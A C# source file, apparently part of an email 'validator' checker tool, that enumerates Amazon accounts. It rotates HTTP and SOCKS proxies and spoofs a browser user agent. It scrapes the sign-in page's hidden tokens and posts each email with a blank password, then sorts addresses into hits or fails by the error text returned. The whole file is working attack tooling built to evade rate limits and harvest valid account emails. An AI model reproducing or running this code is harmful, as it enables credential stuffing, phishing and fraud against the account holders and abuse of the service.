using System;
using Leaf.xNet;
using CheckerSimplefied;
using System.Drawing;
using System.Net;

namespace SC___Mail_Validator
{
    class AmazonVM
    {
        public static void postRequests(string username)
        {
            Utilities.name = "Amazon";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/x-www-form-urlencoded");
                        string url = "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&";
                        var response = request.Raw(HttpMethod.GET, url).ToString();                       
                        string actionToken = response.Replace(" ","").Replace("\n","").Substring("name=\"appActionToken\"value=\"", "\"");
                        string openId = response.Replace(" ", "").Replace("\n", "").Substring("type=\"hidden\"name=\"openid.return_to\"value=\"", "\"");
                        string prevrId = response.Replace(" ", "").Replace("\n", "").Substring("prevRID\"value=\"", "\"");
                        string state = response.Replace(" ", "").Replace("\n", "").Substring("name=\"workflowState\"value=\"", "\"");

                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/x-www-form-urlencoded");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Origin: https://www.amazon.com");
                        string urlPost = "https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&";
                        var responsePost = request.Raw(HttpMethod.POST, urlPost, (HttpContent)new StringContent("appActionToken=" + actionToken + "&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=" + openId + "&prevRID=" + prevrId + "&workflowState=" + state + "&email=" + username + "&password=&metadata1=true")).ToString();
                       
                        if (responsePost.Contains("We cannot find an account with that"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                        if (responsePost.Contains("Forgot your password"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
    }
}
